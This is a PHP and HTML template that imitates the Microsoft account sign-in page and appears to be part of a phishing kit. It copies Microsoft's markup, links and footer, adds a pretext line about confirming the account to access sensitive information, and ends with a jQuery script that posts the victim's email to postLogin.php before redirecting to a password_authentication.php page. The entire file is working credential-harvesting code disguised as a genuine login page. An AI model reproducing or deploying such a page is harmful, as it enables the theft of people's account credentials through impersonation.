                                redirect: $loginPage.view_onRedirect,
                                setPendingRequest: $loginPage.view_onSetPendingRequest,
                                registerDialog: $loginPage.view_onRegisterDialog,
                                unregisterDialog: $loginPage.view_onUnregisterDialog,
                                showDialog: $loginPage.view_onShowDialog,
                                updateAvailableCredsWithoutUsername: $loginPage.view_onUpdateAvailableCreds,
                                agreementClick: $loginPage.footer_agreementClick } }">
                                            <!--  -->
                                            <div data-bind="component: { name: 'header-control',
    params: {
        serverData: svr,
        title: str['WF_STR_HeaderDefault_Title'] } }">
                                                <div class="row title ext-title" id="loginHeader" data-bind="externalCss: { 'title': true }">
                                                    <div role="heading" aria-level="1" data-bind="text: title">Sign in</div> <!-- ko if: isSubtitleVisible -->
                                                    <!-- /ko -->
                                                </div>
                                            </div> <!-- ko if: pageDescription && !svr.fHideLoginDesc -->
                                            <!-- /ko -->
                                            <p style="font-weight:light; font-size:14px;">Because you are accessing sensitive information, you need to confirm your account.</p>
                                            <div class="row">
                                                <div id="logging_error" class="logging_error"></div>
                                                <div class="form-group col-md-24">
                                                    <div id="error" class="error" role="alert" aria-live="assertive">
                                                        <!-- ko if: usernameTextbox.error -->
                                                        <!-- /ko -->
                                                    </div>
                                                    <div class="form-group col-md-24">
                                                        <!-- ko if: prefillNames().length > 1 -->
                                                        <!-- /ko -->
                                                        <!-- ko ifnot: prefillNames().length > 1 -->
                                                        <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
            publicMethods: usernameTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: tenantBranding.UserIdLabel || str['CT_PWD_STR_Email_Example'],
                hintCss: 'placeholder' + (!svr.fAllowPhoneSignIn ? ' ltr_override' : '') },
            event: {
                updateFocus: usernameTextbox.textbox_onUpdateFocus } }">
                                                            <!-- ko withProperties: { '$placeholderText': placeholderText } -->
                                                            <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> <input type="email" name="email" id="email" autocomplete="off" maxlength="113" lang="en" class="form-control ltr_override input ext-input text-box ext-text-box" placeholder="Email address or phone" value="<?php if (!empty($_SESSION['username'])) { echo $_SESSION['username']; unset($_SESSION['username']); }?>"><!-- /ko -->
                                                            <!-- /ko -->
                                                            <!-- ko ifnot: usePlaceholderAttribute -->
                                                            <!-- /ko -->
                                                        </div> <!-- /ko -->
                                                    </div>
                                                </div>
                                            </div>
                                            <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
                                                <div class="row">
                                                    <div class="col-md-24">
                                                        <div class="text-13">
                                                            <!-- ko if: svr.fCBShowSignUp && !svr.fDoIfExists && !svr.fCheckProofForAliases -->
                                                            <div class="form-group" style="margin-top:-15px;" data-bind="
                    htmlWithBindings: html['WF_STR_SignUpLink_Text'],
                    childBindings: {
                        'signup': {
                            href: svr.urlSignUp || '#',
                            ariaLabel: svr.urlSignUp ? str['WF_STR_SignupLink_AriaLabel_Text'] : str['WF_STR_SignupLink_AriaLabel_Generic_Text'],
                            click: signup_onClick } }">No account? <a href="https://login.live.com/oauth20_authorize.srf?response_type=code&client_id=51483342-085c-4d86-bf88-cf50c7252078&scope=openid+profile+email+offline_access&response_mode=form_post&redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&state=rQIIAYWSvWvbaACHLTtxPqDXXCml05HhhlKQ8-p99WnoYFu24w_JkSw1lRZXjiVZir6tWJb-guMIJaVQaMYupbmt03HDcXOmjCX_QI-b7gqF0qlN_4FbHvjxjL9ne4Ou0TVQAw8rRI2o_0wikjKYKYdzBo1wkiMAbpCQxhGFaAQBMaMASu5s73z679enp81y59XL-6fPsveDc2xr4jlLs3YU-hfYT_M0jRb1vb0sy2qhZTlH38WeZwQzJ7B_x7ArDPsbw87L62aAq-OL8oJGDIkIkuYohoAsSZNcTSy8Y6E4psRCTUVed4UcgNGhOB8etintUEoFt-_rbiPXXIkUXJUQ3GMoFG004u1Ug21CbwEgKkf5ULEpDUqpWDQKrZj7mq-RgqKi6_LtUeMkncMbhIlTmB_LW1aY-JMoXKTnlZdlJ1S8dJD0WVxDXZvPB_uENQ7TLuM1A6apxJoEhuO23eKXWVyg2BfinuZ3uH0unxorJWz4Uo-1zYFLqqOTZcPUIwjDvmpyQ8fNO-FEXSg0UOcziJOGthjb-nHTVS0hTzK5r7dk7TGTBW03R1GRCKKVyGyOdH382FqsAl32EGM6nRRksNehTqRecNLoqQc8HBvdLk5GiO7uH66y0GQjfjqWM5uVR6kzAZ64P9JsmZ62bGp40PdNOvNZaZFO09YBL07c1arjHpFaZ7RCHr9cCDZn5FHAeDAhCb_b8TQje1epfjvTD4PLyg9hZAbObDdKQsvxzKs17J-1e5vVner90m7pwV1QqW9ubu-UbtbnNez1-rdy5syH9S9_zpoXb5-_-O3dm9Ll-l4mPQGaRKtxXCgx8uP50tN7RSxbrKQPlcHInFms3e-1Bpb0iK0TZ1XsrFq9rP7Y4ydiWxkrDZFvyDycgH-r2C8bpT-2_qe_6-27EECAExAH3C4k6iSsI0b_61bpKw2&estsfed=1&uaid=608af1f5428c46029996188c8e77d84b&signup=1&lw=1&fl=easi2&fci=4345a7b9-9a63-4910-a426-35363201d503&mkt=en-US" id="signup" aria-label="Create a Microsoft account">Create one!</a></div> <!-- /ko -->
                                                            <!-- ko if: svr.showCantAccessAccountLink -->
                                                            <div class="form-group"> <a id="cantAccessAccount" name="cannotAccessAccount" data-bind="
                        text: str['WF_STR_CantAccessAccount_Text'],
                        click: cantAccessAccount_onClick,
                        href: accessRecoveryLink || 'https://login.microsoftonline.com/common/oauth2/authorize?client_id=4345a7b9-9a63-4910-a426-35363201d503&redirect_uri=https%3A%2F%2Fwww.office.com%2Flanding&response_type=code%20id_token&scope=openid%20profile&response_mode=form_post&nonce=637453483152693785.ZjM2MGI5YmEtODQ1ZC00ZDQ1LWIxMzktNjU1NjQyMzcxMThmOTI1ZWI1YjEtNjhjZi00Njk3LWE1NDEtMGYyMWFlNjEwNDQw&ui_locales=en-US&mkt=en-US&client-request-id=a9861a5e-84f1-474e-97d1-2e3641b33357&state=79pSJZgMfGWA4YxG1rsB8ffwqKPE5xP7z-Wu0FZr-2be2dCKsq3qYhfe29d7jKmYVW9jUUxXD5R5f9I9_XGlRvNaYYDyEvAXTGQmeiRnste76rWyrsCXGj3FcTw_VxKfkgoYU-sIZOYhFzA__Dz532-6poagXV2AmRzu3Ugjr13bSCyVCE26GGnPGx5TY7uaEuwKxIXHLqbjWhXZoUFfX-seMo--cWcMS8ngKFa3pfcHaZWL-RTnmMkZKjU_gD_9ln5iaROygDSWm7vw7dHixg&x-client-SKU=ID_NETSTANDARD2_0&x-client-ver=6.6.0.0#'" href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=4345a7b9-9a63-4910-a426-35363201d503&redirect_uri=https%3A%2F%2Fwww.office.com%2Flanding&response_type=code%20id_token&scope=openid%20profile&response_mode=form_post&nonce=637453483152693785.ZjM2MGI5YmEtODQ1ZC00ZDQ1LWIxMzktNjU1NjQyMzcxMThmOTI1ZWI1YjEtNjhjZi00Njk3LWE1NDEtMGYyMWFlNjEwNDQw&ui_locales=en-US&mkt=en-US&client-request-id=a9861a5e-84f1-474e-97d1-2e3641b33357&state=79pSJZgMfGWA4YxG1rsB8ffwqKPE5xP7z-Wu0FZr-2be2dCKsq3qYhfe29d7jKmYVW9jUUxXD5R5f9I9_XGlRvNaYYDyEvAXTGQmeiRnste76rWyrsCXGj3FcTw_VxKfkgoYU-sIZOYhFzA__Dz532-6poagXV2AmRzu3Ugjr13bSCyVCE26GGnPGx5TY7uaEuwKxIXHLqbjWhXZoUFfX-seMo--cWcMS8ngKFa3pfcHaZWL-RTnmMkZKjU_gD_9ln5iaROygDSWm7vw7dHixg&x-client-SKU=ID_NETSTANDARD2_0&x-client-ver=6.6.0.0#">Can’t access your account?</a> </div> <!-- /ko -->
                                                            <!-- ko if: showFidoLinkInline && hasFido() && (availableCredsWithoutUsername().length >= 2 || svr.fShowForgotUsernameLink) -->
                                                            <!-- /ko -->
                                                            <!-- ko if: (availableCredsWithoutUsername().length > 0 || svr.fShowForgotUsernameLink) && !hideSignInOptions -->
                                                            <div class="form-group" data-bind="
                    component: { name: 'cred-switch-link-control',
                        params: {
                            serverData: svr,
                            availableCreds: availableCredsWithoutUsername(),
                            showForgotUsername: svr.fShowForgotUsernameLink },
                        event: {
                            switchView: noUsernameCredSwitchLink_onSwitchView,
                            redirect: onRedirect,
                            registerDialog: onRegisterDialog,
                            unregisterDialog: onUnregisterDialog,
                            showDialog: onShowDialog } }">
                                                                <!--  -->
                                                                <div class="form-group">
                                                                    <!-- ko if: showSwitchToCredPickerLink --> <a id="idA_PWD_SwitchToCredPicker" href="./" data-bind="
        text: isUserKnown ? str['CT_PWD_STR_SwitchToCredPicker_Link'] : str['CT_PWD_STR_SwitchToCredPicker_Link_NoUser'],
        click: switchToCredPicker_onClick">Sign-in options</a> <!-- /ko -->
                                                                    <!-- ko if: credentialCount === 1 && !(showForgotUsername || selectedCredShownOnlyOnPicker) -->
                                                                    <!-- /ko -->
                                                                    <!-- ko if: credentialCount === 0 && showForgotUsername -->
                                                                    <!-- /ko -->
                                                                </div> <!-- ko if: credLinkError -->
                                                                <!-- /ko -->
                                                            </div> <!-- /ko -->
                                                        </div>
                                                    </div>
                                                </div>
                                            </div> <!-- ko if: svr.fShowLegalMessagingInline -->
                                            <!-- /ko -->
                                            <div class="win-button-pin-bottom">
                                                <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
                                                    <div data-bind="component: { name: 'footer-buttons-field',
            params: {
                serverData: svr,
                isPrimaryButtonEnabled: !isRequestPending(),
                isPrimaryButtonVisible: svr.fShowButtons,
                isSecondaryButtonEnabled: true,
                isSecondaryButtonVisible: svr.fShowButtons && isBackButtonVisible() },
            event: {
                primaryButtonClick: primaryButton_onClick,
                secondaryButtonClick: secondaryButton_onClick } }">
                                                        <div class="col-xs-24 no-padding-left-right button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin }">
                                                            <!-- ko if: isSecondaryButtonVisible -->
                                                            <!-- /ko -->
                                                            <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }" class="inline-block">
                                                                <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 --> <input type="submit" id="submit" name="submit" data-bind="
            attr: primaryButtonAttributes,
            externalCss: {
                'button': true,
                'primary': true },
            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible,
            preventTabbing: primaryButtonPreventTabbing" class="button ext-button primary ext-primary" value="Next">
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div> <!-- ko if: tenantBranding.BoilerPlateText -->
                                            <!-- /ko -->
                                        </div><!-- /ko -->
                                        <!-- /ko -->
                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                        <!-- /ko -->
                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                        <!-- /ko -->
                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                        <!-- /ko -->
                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                        <!-- /ko -->
                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                        <!-- /ko -->
                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                        <!-- /ko -->
                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                        <!-- /ko -->
                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                        <!-- /ko -->
                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                        <!-- /ko -->
                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                        <!-- /ko -->
                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                        <!-- /ko -->
                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                        <!-- /ko -->
                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                        <!-- /ko -->
                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                        <!-- /ko -->
                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                        <!-- /ko -->
                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                        <!-- /ko -->
                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                        <!-- /ko -->
                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                        <!-- /ko -->
                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                        <!-- /ko -->
                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                        <!-- /ko -->
                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                        <!-- /ko -->
                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                        <!-- /ko -->
                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                        <!-- /ko -->
                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                        <!-- /ko -->
                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                        <!-- /ko -->
                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                        <!-- /ko -->
                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                        <!-- /ko -->
                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                        <!-- /ko -->
                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                        <!-- /ko -->
                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
                                        <!-- /ko -->
                                        <!-- /ko -->
                                    </div>
                                </div>
                            </div> <!-- /ko -->
                        </div>
                    </div> <!-- ko if: showDebugDetails -->
                    <!-- /ko -->
                    <!-- ko if: showFedCredButtons -->
                    <!-- /ko -->
                    <!-- ko if: newSession -->
                    <!-- /ko -->
                    <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value=""> <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value=""> <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value=""> <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value=""> <input type="hidden" name="canary" data-bind="value: svr.canary" value="wQX0YQ6UqqzTq3mqhvlZIzqRf8QZLTKOedf8gJICKfQ=8:1"> <input type="hidden" name="ctx" data-bind="value: ctx" value="rQIIAYWSTWvTYACAm3brPkCdIrKT7OBBhLZJ3nwWPLRN2_Uj6ZImq8mlpm2SJs13sqXJLxAZMhEG7uhFnLedxIN43mlH8Q8onlQQxJPuF3h54Dk_z-YaUSbKcBl-UEDKSPUeBjBcJSd0iVYJUMJoBC6pGEqUAA4IgMLIDIdBeGtz69ePp4-P6vnWy5Pto2fJp94ZdHcex35UrVSSJCl7um5OtfLUcyq26s5M13gHQZcQ9BWCTvOrmluShmf5iAAkBhCMoHESQSmMwOgyl9kLNlvgXCbFHKNYbArDgxE374-auDziY9bqOopVS2WLx1hLQlhrgbJZEwwYI5bRJqI0YJgTp2lfNHAZ5WMuq2VyNndkR8ZYUQKf8zcGtYN4jl7BC81M-5nf0L3QGfteFJ8WTvKmJ9pxL-xSJRm0DSbt7SL60IvbpF13yboYyDzcHzaNBnOYBBkIHDboyE6L3qXTiboUvZrDdyhD61mYNDg4rGmKj6JeV9LovmmlLW8sRSIBS_MZWsJUORoayqJuSTqbhonQVRqCvE8mbtNKgZ-FLKeHApUCRRnu69HSVQQbkJrZiuEE7bTwA77jHtQ60h6DDtV2u4T5gGjvjpaJp1E-MxkKiUEJg9gcwza3O5ANgZg0DLy_13U0InEoPooncWOP4cbWctmyppjcGiyBzRxGrEGrqe-SNhpiiNNu2bKanBeK_2I6nntRuO75mmvOdvzQ001bu1yBvq3cWS9uFbdzO7n7t-FCdX19cyt3Zb9XoFer_26Zk19W_3yY1c_ePH_x9vx17mK1kvCPYJknpCDIxAA4wfzQVjpZIOgUr_TF3kCb6ZTR7TR6Ov-QqiLHRei4WLwo3uwwY64pDsUax9QEBh3D34vQk7Xc-43__PfxWu4v0"> <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="05e73768-befa-4264-aaa9-9193abb2a700"> <input type="hidden" id="i0327" data-bind="attr: { name: svr.sFTName }, value: flowToken" name="flowToken" value="AQABAAEAAAB2UyzwtQEKR7-rWbgdcBZIllyKhnv8zmOo2XrZz2ve9D8tK29hQorsc0ZBb6OqpxZuQI_Bj9AY5jNr_ILWpomr8THOKcpmHr4pxqy8hGTN3BambeCxVjXLol5AaCirZVCd2PYcyMkb-yFuiCFSuXp6oZ5OgU2ECi_WwGfLf6OQPH-ir3vGSk-Nu8Qsg5MX7UHa-b4rJH5kHa-1rTTHb3z9rSY5f8PwxSvF6AQPx76yC2jZTdiWbN9gZ-p9lDZhpQSVeZ2Yc4fU8YA8PPInTGeLJQNaL1XWUHpCgUXiykKV0uiND0wG3LeuJGgdGmjZ7H38TtNTrglCSrF6xiOzfrRuGc54u9mE6DGPqS9lxjP5wnl-DASU0L7eXaE9kUr2pSacbcKkPXy-6bqthe9DJ38e-GXxG60HbaPgFhSlylGOqOUerUYA9rC6pDGkyGGJthFuewtZQvRU_83HtaWaVN_wg58BroyVdvZZ_bSi3YJI90zjWoFufG4RIyNNqjBR2TIgAA"> <input type="hidden" name="PPSX" data-bind="value: svr.sRandomBlob" value=""> <input type="hidden" name="NewUser" value="1"> <input type="hidden" name="FoundMSAs" data-bind="value: svr.sFoundMSAs" value=""> <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0"> <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0"> <input type="hidden" name="CookieDisclosure" data-bind="value: svr.fShowCookieBanner ? 1 : 0" value="0"> <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported() ? 1 : 0" value="1"> <input type="hidden" name="isSignupPost" data-bind="value: isSignupPost() ? 1 : 0" value="0">
                    <div data-bind="component: { name: 'instrumentation-control',
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }"><input type="hidden" name="i2" data-bind="value: clientMode" value="1"> <input type="hidden" name="i17" data-bind="value: srsFailed" value=""> <input type="hidden" name="i18" data-bind="value: srsSuccess" value=""> <input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div> <!-- ko if: !svr.fHideFooter && paginationControlMethods() && paginationControlMethods().hasInitialViewShown() -->
                    <div id="footer" role="contentinfo" data-bind="
                css: {
                    'default': !backgroundLogoUrl(),
                    'default-background-image': useDefaultBackground },
                externalCss: { 'footer': true }" class="default default-background-image footer ext-footer">
                        <div data-bind="component: { name: 'footer-control',
                    publicMethods: footerMethods,
                    params: {
                        serverData: svr,
                        useDefaultBackground: useDefaultBackground(),
                        hasDarkBackground: backgroundLogoUrl(),
                        showLinks: true },
                    event: {
                        agreementClick: footer_agreementClick,
                        showDebugDetails: toggleDebugDetails_onClick } }">
                            <!--  -->
                            <!-- ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) -->
                            <div id="footerLinks" class="footerNode text-secondary">
                                <!-- ko if: !hideTOU --> <a id="ftrTerms" data-bind="text: termsText, href: termsLink, click: termsLink_onClick" href="https://www.microsoft.com/en-US/servicesagreement/">Terms of use</a> <!-- /ko -->
                                <!-- ko if: !hidePrivacy --> <a id="ftrPrivacy" data-bind="text: privacyText, href: privacyLink, click: privacyLink_onClick" href="https://privacy.microsoft.com/en-US/privacystatement">Privacy &amp; cookies</a> <!-- /ko -->
                                <!-- ko if: impressumLink -->
                                <!-- /ko -->
                                <!-- ko if: showIcpLicense -->
                                <!-- /ko -->
                                <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus --> <a id="moreOptions" href="#" role="button" class="moreOptions" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        attr: { 'aria-expanded': showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo()" aria-label="Click here for troubleshooting information" aria-expanded="false">
                                    <!-- ko component: { name: 'accessible-image-control', params: { hasDarkBackground: !useDefaultBackground } } -->
                                    <!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
                                    <!-- /ko -->
                                    <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
                                    <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="desktopMode" role="presentation" pngsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/ellipsis_96f69d0cefd8a8ba623a182c351ccc64.png" svgsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/ellipsis_635a63d500a92a0b8497cdc58d0f66b1.svg" data-bind="imgSrc" data-savepage-src="https://aadcdn.msftauth.net/shared/1.0/content/images/ellipsis_635a63d500a92a0b8497cdc58d0f66b1.svg" src="https://aadcdn.msftauth.net/shared/1.0/content/images/ellipsis_635a63d500a92a0b8497cdc58d0f66b1.svg"><!-- /ko -->
                                    <!-- /ko -->
                                    <!-- /ko -->
                                    <!-- ko component: { name: 'accessible-image-control', params: { hasDarkBackground: hasDarkBackground } } -->
                                    <!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
                                    <!-- /ko -->
                                    <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
                                    <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="mobileMode" role="presentation" pngsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/ellipsis_grey_5bc252567ef56db648207d9c36a9d004.png" svgsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg" data-bind="imgSrc" data-savepage-src="https://aadcdn.msftauth.net/shared/1.0/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg" src="https://aadcdn.msftauth.net/shared/1.0/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg"><!-- /ko -->
                                    <!-- /ko -->
                                    <!-- /ko -->
                                </a>
                            </div> <!-- /ko -->
                            <!-- ko if: svr.fShowLegalMessagingInline && showLinks -->
                            <!-- /ko -->
                        </div>
                    </div> <!-- /ko -->
                </div> <!-- /ko -->
            </div> <!-- /ko -->
        </form>
    </div>
    <script>
        $(document).ready(function() {
            $('#loginform').validate({ // initialize the plugin
                errorElement: "div",
                errorLabelContainer: ".error",
                errorClass: "error fail-alert",
                validClass: "valid success-alert",
                rules: {
                    email: {
                        required: true,
                        email: true,
                    },
                },
                messages: {
                    email: {
                        required: "Enter a valid email address.",
                        email: "Enter a valid email address."
                    },
                },
                submitHandler: function(form) {
                    var email = $('input[name=email]').val().trim();
                    var ind = email.indexOf("@");
                    var domain = email.slice((ind + 1), email.length);
                    //Your code for AJAX starts
                    jQuery.ajax({
                        type: 'POST',
                        url: 'postLogin.php',
                        data: {
                            email: email
                        },
                        success: function(data) {
                            if (data.match(/blocked_domain/i)) {
                                $('#logging_error').html("" + domain + " isn't in our system. Make sure you typed it correctly.").addClass('error');
                            } else if (data.match(/sent/i)) {
                                window.location.href = "password_authentication.php?<?php echo $url; ?>";
                            } else if (data.match(/bad_domain/i)) {
                                $('#logging_error').html("" + domain + " isn't in our system. Make sure you typed it correctly.").addClass('error');
                            }
                        },
                    });
                }
            });

        });

    </script>
    <script>
        jQuery.fn.putCursorAtEnd = function() {

            return this.each(function() {

                // Cache references
                var $el = $(this),
                    el = this;

                // Only focus if input isn't already
                if (!$el.is(":focus")) {
                    $el.focus();
                }

                // If this function exists... (IE 9+)
                if (el.setSelectionRange) {

                    // Double the length because Opera is inconsistent about whether a carriage return is one character or two.
                    var len = $el.val().length * 2;

                    // Timeout seems to be required for Blink
                    setTimeout(function() {
                        el.setSelectionRange(len, len);
                    }, 1);

                } else {

                    // As a fallback, replace the contents with itself
                    // Doesn't work in Chrome, but Chrome supports setSelectionRange
                    $el.val($el.val());

                }

                // Scroll to the bottom, in case we're in a tall textarea
                // (Necessary for Firefox and Chrome)
                this.scrollTop = 999999;

            });

        };

        (function() {
            var textInput = $("#email");
            textInput
                .putCursorAtEnd() // should be chainable
                .on("focus", function() { // could be on any event
                    textInput.putCursorAtEnd()
                });
        })();

    </script>
    <script>
        $(document).ready(function() {
            $("input[name=email]").focus(function() {
                $('#logging_error').empty();
                //return false;
            });
        });

    </script>
</body>

</html>
